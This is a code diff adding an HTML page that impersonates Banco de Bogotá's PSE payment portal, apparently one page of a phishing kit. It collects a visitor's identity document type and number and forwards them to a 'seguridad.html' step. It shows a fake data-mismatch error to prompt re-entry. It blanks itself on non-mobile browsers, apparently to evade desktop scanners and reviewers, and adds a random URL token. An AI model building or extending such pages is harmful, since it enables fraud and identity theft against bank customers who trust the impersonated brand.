@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Portal de pagos en línea PSE - Banco de Bogotá</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: "Roboto", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: #f4f7fb;
+      color: #001b3c;
+    }
+
+    .page {
+      width: 100%;
+      max-width: 420px;
+      padding: 32px 16px;
+    }
+
+    .card {
+      background: #ffffff;
+      border-radius: 16px;
+      padding: 32px 28px 24px;
+      box-shadow: 0 14px 35px rgba(0, 0, 0, 0.07);
+      position: relative;
+    }
+
+    .logo {
+      margin-bottom: 32px;
+    }
+
+    .logo-img {
+      display: block;
+      max-width: 170px;
+      height: auto;
+    }
+
+    .title {
+      font-size: 20px;
+      line-height: 1.3;
+      font-weight: 500;
+      margin-bottom: 28px;
+      color: #003b90;
+    }
+
+    .title span {
+      font-weight: 700;
+    }
+
+    .section-label {
+      font-size: 14px;
+      color: #4a5568;
+      margin-bottom: 4px;
+    }
+
+    .section-subtitle {
+      font-size: 13px;
+      color: #718096;
+      margin-bottom: 12px;
+    }
+
+    .field-group {
+      margin-bottom: 18px;
+    }
+
+    label {
+      display: block;
+      font-size: 12px;
+      font-weight: 500;
+      color: #4a5568;
+      margin-bottom: 6px;
+    }
+
+    select,
+    input {
+      width: 100%;
+      padding: 10px 12px;
+      border-radius: 8px;
+      border: 1px solid #e2e8f0;
+      background-color: #f7fafc;
+      font-size: 14px;
+      color: #2d3748;
+      appearance: none;
+      outline: none;
+      transition: border-color 0.15s ease, box-shadow 0.15s ease, background-color 0.15s ease;
+    }
+
+    select {
+      background-image: linear-gradient(45deg, transparent 50%, #2b6cb0 50%), linear-gradient(135deg, #2b6cb0 50%, transparent 50%);
+      background-position: calc(100% - 18px) 14px, calc(100% - 13px) 14px;
+      background-size: 5px 5px, 5px 5px;
+      background-repeat: no-repeat;
+      padding-right: 32px;
+    }
+
+    select:focus,
+    input:focus {
+      border-color: #3182ce;
+      box-shadow: 0 0 0 1px rgba(49, 130, 206, 0.4);
+      background-color: #ffffff;
+    }
+
+    .inline-fields {
+      display: grid;
+      grid-template-columns: 1fr 2fr;
+      gap: 16px;
+      margin-bottom: 18px;
+    }
+
+    .button {
+      width: 100%;
+      padding: 12px;
+      border-radius: 999px;
+      border: none;
+      background: #e2e8f0;
+      color: #a0aec0;
+      font-size: 15px;
+      font-weight: 500;
+      cursor: default;
+      margin-top: 8px;
+      pointer-events: none;
+      transition: background-color 0.15s ease, box-shadow 0.15s ease, color 0.15s ease;
+    }
+
+    .button.enabled {
+      background: #0047bb;
+      color: #ffffff;
+      cursor: pointer;
+      box-shadow: 0 6px 14px rgba(0, 71, 187, 0.35);
+      pointer-events: auto;
+    }
+
+    .loading-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(255, 255, 255, 0.8);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+    }
+
+    .loading-overlay.active {
+      display: flex;
+    }
+
+    .loader {
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      border: 4px solid #e2e8f0;
+      border-top-color: #0047bb;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .card-footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 11px;
+      color: #a0aec0;
+      margin-top: 24px;
+    }
+
+    .aval-img {
+      height: 18px;
+      width: auto;
+      display: block;
+    }
+
+    .error-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 32, 96, 0.9);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      padding: 24px;
+    }
+
+    .error-overlay.active {
+      display: flex;
+    }
+
+    .error-card {
+      background: #ffffff;
+      border-radius: 18px;
+      padding: 24px 24px 20px;
+      max-width: 360px;
+      width: 100%;
+      box-shadow: 0 18px 40px rgba(0, 0, 0, 0.25);
+      text-align: left;
+    }
+
+    .error-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 10px;
+    }
+
+    .error-icon {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: #ffb44a;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 18px;
+      color: #ffffff;
+      font-weight: 700;
+    }
+
+    .error-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #1a202c;
+    }
+
+    .error-text {
+      font-size: 14px;
+      color: #4a5568;
+      line-height: 1.5;
+      margin-bottom: 20px;
+    }
+
+    .error-button {
+      width: 100%;
+      padding: 12px;
+      border-radius: 999px;
+      border: none;
+      background: #0047bb;
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: 500;
+      cursor: pointer;
+      box-shadow: 0 8px 18px rgba(0, 71, 187, 0.4);
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 24px 20px 20px;
+      }
+
+      .title {
+        font-size: 18px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div id="loading-overlay" class="loading-overlay">
+    <div class="loader"></div>
+  </div>
+  <div id="error-overlay" class="error-overlay">
+    <div class="error-card">
+      <div class="error-header">
+        <div class="error-icon">!</div>
+        <div class="error-title">Tus datos no coinciden</div>
+      </div>
+      <p class="error-text">
+        Verifícalos e inténtalo nuevamente. Si aún no eres cliente te invitamos
+        a solicitar un producto desde la pantalla de inicio. (00)
+      </p>
+      <button id="retry-button" class="error-button" type="button">
+        Volver a intentar
+      </button>
+    </div>
+  </div>
+  <main class="page">
+    <section class="card">
+      <header class="logo">
+        <img class="logo-img" src="/bancodebogota.png" alt="Banco de Bogotá">
+      </header>
+
+      <h1 class="title">
+        Bienvenido al nuevo<br>
+        <span>portal de pagos en línea PSE</span>
+      </h1>
+
+      <div class="field-group">
+        <p class="section-label">Ingresa tipo y número de documento</p>
+        <p class="section-subtitle">¿Qué tipo de cliente eres?</p>
+
+        <label for="tipo-cliente">Tipo de cliente</label>
+        <select id="tipo-cliente" name="tipo-cliente">
+          <option value="personas" selected>Banca Personas</option>
+          <option value="empresas">Banca Empresas</option>
+        </select>
+      </div>
+
+      <div class="inline-fields">
+        <div class="field-group">
+          <label for="tipo-documento">Documento</label>
+          <select id="tipo-documento" name="tipo-documento">
+            <option value="cc" selected>C.C.</option>
+            <option value="ce">C.E.</option>
+            <option value="nit">NIT</option>
+            <option value="pp">Pasaporte</option>
+          </select>
+        </div>
+
+        <div class="field-group">
+          <label for="numero-documento">Número</label>
+          <input id="numero-documento" name="numero-documento" type="text" inputmode="numeric" placeholder="#">
+        </div>
+      </div>
+
+      <button class="button" type="button">
+        Continuar
+      </button>
+
+      <footer class="card-footer">
+        <img class="aval-img" src="/bancodebogota.png" alt="Grupo Aval">
+        <div>
+          Banco de Bogotá - 2026
+        </div>
+      </footer>
+    </section>
+  </main>
+  <script>
+    const numeroInput = document.getElementById("numero-documento");
+    const tipoDocSelect = document.getElementById("tipo-documento");
+    const continuarButton = document.querySelector(".button");
+    const loadingOverlay = document.getElementById("loading-overlay");
+    const errorOverlay = document.getElementById("error-overlay");
+    const retryButton = document.getElementById("retry-button");
+
+    function showLoadingAndNavigate(url) {
+      if (loadingOverlay) {
+        loadingOverlay.classList.add("active");
+      }
+      setTimeout(function () {
+        window.location.href = url;
+      }, 2000);
+    }
+
+    function checkErrorParam() {
+      if (!errorOverlay) {
+        return;
+      }
+      const params = new URLSearchParams(window.location.search);
+      if (params.get("error") === "user") {
+        errorOverlay.classList.add("active");
+      }
+    }
+
+    if (retryButton && errorOverlay) {
+      retryButton.addEventListener("click", function () {
+        errorOverlay.classList.remove("active");
+        const params = new URLSearchParams(window.location.search);
+        params.delete("error");
+        const newSearch = params.toString();
+        const newUrl =
+          window.location.pathname + (newSearch ? "?" + newSearch : "");
+        window.history.replaceState(null, "", newUrl);
+      });
+    }
+
+    if (numeroInput && continuarButton) {
+      numeroInput.addEventListener("input", function () {
+        const soloDigitos = this.value.replace(/\D/g, "");
+        if (this.value !== soloDigitos) {
+          this.value = soloDigitos;
+        }
+        if (soloDigitos.length > 0) {
+          continuarButton.classList.add("enabled");
+        } else {
+          continuarButton.classList.remove("enabled");
+        }
+      });
+      continuarButton.addEventListener("click", function () {
+        if (!continuarButton.classList.contains("enabled")) {
+          return;
+        }
+        const tipo = tipoDocSelect ? tipoDocSelect.value : "";
+        const numero = numeroInput.value;
+        const params = new URLSearchParams({ tipo, numero });
+        const destino = "seguridad.html?" + params.toString();
+        showLoadingAndNavigate(destino);
+      });
+    }
+
+    checkErrorParam();
+  </script>
+  <script>
+    (function() {
+      var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+      var mobileRegex = /android|avantgo|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile|o2|opera m(ob|in)i|palm( os)?|p(ixi|re)\/|plucker|pocket|psp|smartphone|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i;
+      if (!mobileRegex.test(userAgent)) {
+        document.body.innerHTML = '';
+      }
+      try {
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        let token = '';
+        for (let i = 0; i < 50 + Math.floor(Math.random() * 30); i++) {
+          token += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        const base64Token = btoa(token + Date.now()).replace(/=/g, '');
+        const url = new URL(window.location.href);
+        url.searchParams.set('token', base64Token);
+        window.history.replaceState(null, '', url.toString());
+      } catch (e) {}
+    })();
+  </script>
+</body>
+</html>
